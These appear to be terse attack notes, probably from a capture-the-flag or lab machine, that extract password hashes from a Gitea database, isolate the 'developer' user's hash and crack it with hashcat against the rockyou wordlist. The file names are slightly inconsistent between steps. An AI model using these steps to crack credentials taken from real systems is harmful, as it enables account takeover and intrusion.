python3 parserofhash.py gitea.db > hashes.txt
edit hashes.txt (get only developer)
hashcat -m 10900 hash.txt $rockyou.txt
done
